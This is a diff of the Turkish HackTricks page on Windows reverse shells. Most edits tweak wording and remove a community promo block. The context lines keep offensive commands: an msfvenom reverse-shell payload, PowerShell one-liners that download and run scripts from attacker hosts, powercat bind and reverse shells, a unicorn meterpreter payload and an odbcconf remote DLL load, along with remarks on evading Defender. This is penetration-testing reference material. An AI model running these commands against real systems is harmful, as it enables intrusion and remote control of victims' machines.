@@ -15,18 +15,10 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 </details>
 {% endhint %}
 
-**Try Hard Security Group**
-
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
-
-***
-
 ## Lolbas
 
-Sayfa [lolbas-project.github.io](https://lolbas-project.github.io/) Windows için, [https://gtfobins.github.io/](https://gtfobins.github.io/) ise Linux içindir.\
-Açıkça, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **ikili dosyaların** nasıl (kötüye) kullanılabileceğini bilmek faydalıdır, böylece bazı beklenmedik eylemleri gerçekleştirmek için **rastgele kod çalıştırma** gibi. 
+Sayfa [lolbas-project.github.io](https://lolbas-project.github.io/) Windows için, [https://gtfobins.github.io/](https://gtfobins.github.io/) ise linux için.\
+Açıkça, **Windows'ta SUID dosyaları veya sudo ayrıcalıkları yoktur**, ancak bazı **ikili dosyaların** nasıl (kötüye) kullanılabileceğini bilmek faydalıdır, böylece **rastgele kod çalıştırmak** gibi beklenmedik eylemler gerçekleştirebiliriz.
 
 ## NC
 ```bash
@@ -297,7 +289,7 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://10.2.0
 ```bash
 msfvenom -p cmd/windows/reverse_powershell lhost=10.2.0.5 lport=4444 -f vbs > shell.vbs
 ```
-**Defansör tarafından tespit edildi**
+**Defans tarafından tespit edildi**
 
 ## PS-Bat
 ```bash
@@ -403,7 +395,7 @@ odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Bir web sunucusunda scripti çalıştırmaya başlayın ve bunu kurbanın tarafında yürütün:
+Bir web sunucusunda scripti çalıştırmaya başlayın ve kurbanın tarafında yürütün:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -421,9 +413,9 @@ powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 
 ```
 Defender bunu kötü niyetli kod olarak tespit etmiyor (henüz, 3/04/2019).
 
-**Powercat tarafından sunulan diğer seçenekler:**
+**powercat tarafından sunulan diğer seçenekler:**
 
-Bind shell, Ters shell (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Payload oluşturma, Dosya sunma...
+Bind shell'ler, Ters shell (TCP, UDP, DNS), Port yönlendirme, yükleme/indirme, Payload oluşturma, Dosya sunma...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -458,7 +450,7 @@ Unicorn kullanarak metasploit arka kapısının bir powershell versiyonunu oluş
 ```
 python unicorn.py windows/meterpreter/reverse_https 10.2.0.5 443
 ```
-Oluşturulan kaynak ile msfconsole'ı başlatın:
+msfconsole'ı oluşturulan kaynak ile başlatın:
 ```
 msfconsole -r unicorn.rc
 ```
@@ -483,12 +475,7 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) bazı saldırgan PS modülleri
 * [https://www.hackingarticles.in/koadic-com-command-control-framework/](https://www.hackingarticles.in/koadic-com-command-control-framework/)
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
-​
-**Try Hard Security Group**
 
-<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
-
-{% embed url="https://discord.gg/tryhardsecurity" %}
 
 {% hint style="success" %}
 AWS Hacking'i öğrenin ve pratik yapın:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
@@ -499,8 +486,8 @@ GCP Hacking'i öğrenin ve pratik yapın: <img src="/.gitbook/assets/grte.png" a
 <summary>HackTricks'i Destekleyin</summary>
 
 * [**abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
-* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter**'da **bizi takip edin** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
-* **Hacking ipuçlarını paylaşmak için [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.**
+* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın ya da **Twitter'da** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**'i takip edin.**
+* **Hacking ipuçlarını paylaşmak için** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gönderin.
 
 </details>
 {% endhint %}
